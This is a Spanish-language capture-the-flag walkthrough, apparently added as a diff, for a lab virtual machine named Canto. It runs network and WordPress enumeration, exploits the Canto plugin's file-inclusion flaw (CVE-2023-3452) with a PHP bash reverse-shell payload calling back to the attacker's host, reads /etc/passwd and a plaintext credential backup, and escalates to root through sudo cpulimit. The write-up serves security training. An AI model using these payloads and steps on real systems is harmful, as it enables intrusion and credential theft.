@@ -1,0 +1,154 @@
+Identificamos la IP de la máquina víctima:
+❯ arp-scan --interface=wlo1 --localnet | grep PCS | awk '{print $1}'
+192.168.1.11
+
+Enumeramos puertos:
+❯ sudo nmap -p- -sS --min-rate 5000 -n -Pn -oG 01-allPorts 192.168.1.11
+[sudo] contraseña para wh01s17: 
+Starting Nmap 7.97 ( https://nmap.org ) at 2025-08-08 16:38 -0400
+Nmap scan report for 192.168.1.11
+Host is up (0.00015s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+MAC Address: 08:00:27:04:80:B3 (Oracle VirtualBox virtual NIC)
+
+Nmap done: 1 IP address (1 host up) scanned in 0.93 seconds
+
+❯ nmap -sCV -p 22,80 -oN 02-targeted.txt 192.168.1.11
+Starting Nmap 7.97 ( https://nmap.org ) at 2025-08-08 16:38 -0400
+Nmap scan report for 192.168.1.11
+Host is up (0.00034s latency).
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 9.3p1 Ubuntu 1ubuntu3.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 c6:af:18:21:fa:3f:3c:fc:9f:e4:ef:04:c9:16:cb:c7 (ECDSA)
+|_  256 ba:0e:8f:0b:24:20:dc:75:b7:1b:04:a1:81:b6:6d:64 (ED25519)
+80/tcp open  http    Apache httpd 2.4.57 ((Ubuntu))
+|_http-server-header: Apache/2.4.57 (Ubuntu)
+|_http-title: Canto
+|_http-generator: WordPress 6.5.3
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 9.67 seconds
+
+Enumeramos directorios con gobuster:
+❯ gobuster dir -u 'http://192.168.1.11' -w ~/Documentos/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,txt,html,sql,xml,zip,sh,db -r 
+...
+/wp-content           (Status: 200) [Size: 0]
+/index.php            (Status: 200) [Size: 47514]
+/wp-login.php         (Status: 200) [Size: 5194]
+/license.txt          (Status: 200) [Size: 19903]
+/wp-includes          (Status: 200) [Size: 60615]
+/readme.html          (Status: 200) [Size: 7425]
+/wp-trackback.php     (Status: 200) [Size: 135]
+/wp-admin             (Status: 200) [Size: 5194]
+/xmlrpc.php           (Status: 405) [Size: 42]
+/wp-signup.php        (Status: 200) [Size: 5386]
+/server-status        (Status: 403) [Size: 277]
+...
+
+Analizamos los plugins con wpscan:
+❯ wpscan --url http://192.168.1.11 --plugins-detection aggressive -t 50 
+...
+[+] canto
+ | Location: http://192.168.1.11/wp-content/plugins/canto/
+ | Last Updated: 2025-04-10T07:17:00.000Z
+ | Readme: http://192.168.1.11/wp-content/plugins/canto/readme.txt
+ | [!] The version is out of date, the latest version is 3.1.0
+ |
+ | Found By: Known Locations (Aggressive Detection)
+ |  - http://192.168.1.11/wp-content/plugins/canto/, status: 200
+ |
+ | Version: 3.0.4 (100% confidence)
+ | Found By: Readme - Stable Tag (Aggressive Detection)
+ |  - http://192.168.1.11/wp-content/plugins/canto/readme.txt
+ | Confirmed By: Composer File (Aggressive Detection)
+ |  - http://192.168.1.11/wp-content/plugins/canto/package.json, Match: '3.0.4'
+...
+
+Buscamos vulnerabilidades conocidas:
+❯ searchsploit canto 3.0.4 
+------------------------------------------------------------------------------------------ ----------------------
+ Exploit Title                                                                            |  Path
+------------------------------------------------------------------------------------------ ----------------------
+Wordpress Plugin Canto < 3.0.5 - Remote File Inclusion (RFI) and Remote Code Execution (R | php/webapps/51826.py
+
+El plugin canto, tiene una vulnerabilidad de RFI con CVE 2023-3452.
+
+Utilizamos el exploit para ejecutar una reverse shell en php:
+❯ cat pwned.php
+<?php 
+  shell_exec("bash -c 'bash -i >& /dev/tcp/192.168.1.4/4321 0>&1'"); 
+?>
+
+❯ python3 51826.py -u http://192.168.1.11 -LHOST 192.168.1.4 -LPORT 1234 -s pwned.php
+Exploitation URL: http://192.168.1.11/wp-content/plugins/canto/includes/lib/download.php?wp_abspath=http://192.168.1.4:1234&cmd=whoami
+Local web server on port 1234...
+nc: getaddrinfo: Servname not supported for ai_socktype
+192.168.1.11 - - [08/Aug/2025 17:28:24] "GET /wp-admin/admin.php HTTP/1.1" 200 -
+
+❯ ncat -nlvp 4321
+Ncat: Version 7.97 ( https://nmap.org/ncat )
+Ncat: Listening on [::]:4321
+Ncat: Listening on 0.0.0.0:4321
+Ncat: Connection from 192.168.1.11:43910.
+bash: cannot set terminal process group (684): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@canto:/var/www/html/wp-content/plugins/canto/includes/lib$
+
+Obtenemos una shell del usuario www-data y listamos los usuarios del sistema con una bash establecida:
+www-data@canto:/var/www/html/wp-content/plugins/canto/includes/lib$ cat /etc/passwd | grep bash
+root:x:0:0:root:/root:/bin/bash
+erik:x:1001:1001::/home/erik:/bin/bash
+
+Ingresamos al directorio del usuario erik y encontramos un directorio con 2 notas:
+www-data@canto:/home/erik/notes$ ls -la
+total 16
+drwxrwxr-x 2 erik erik     4096 May 12  2024 .
+drwxr-xr-- 5 erik www-data 4096 May 12  2024 ..
+-rw-rw-r-- 1 erik erik       68 May 12  2024 Day1.txt
+-rw-rw-r-- 1 erik erik       71 May 12  2024 Day2.txt
+
+www-data@canto:/home/erik/notes$ cat Day1.txt
+On the first day I have updated some plugins and the website theme.
+
+www-data@canto:/home/erik/notes$ cat Day2.txt
+I almost lost the database with my user so I created a backups folder.
+
+Ingresamos a /var/wordpress/backups y descubrimos un archivo de texto:
+www-data@canto:/var/wordpress/backups$ cat 12052024.txt
+------------------------------------
+| Users	    |      Password        |
+------------|----------------------|
+| erik      | th1sIsTheP3ssw0rd!   |
+------------------------------------
+
+Nos logueamos como el usuario erik, y obtenemos la primera flag:
+www-data@canto:/var/wordpress/backups$ su erik
+Password: th1sIsTheP3ssw0rd!
+
+erik@canto:/var/wordpress/backups$
+
+Para escalar privilegios como root, ejecutamos el comando sudo -l:
+erik@canto:~$ sudo -l
+Matching Defaults entries for erik on canto:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
+    use_pty
+
+User erik may run the following commands on canto:
+    (ALL : ALL) NOPASSWD: /usr/bin/cpulimit
+
+Podemos ejecutar el comando cpulimit como cualquier usuario y sin contraseña.
+
+Para obtener una shell, ejecutamos lo siguiente:
+erik@canto:~$ sudo cpulimit -l 100 -f /bin/sh
+# whoami
+root
+
+Obtenemos la ultima flag y fin.
+
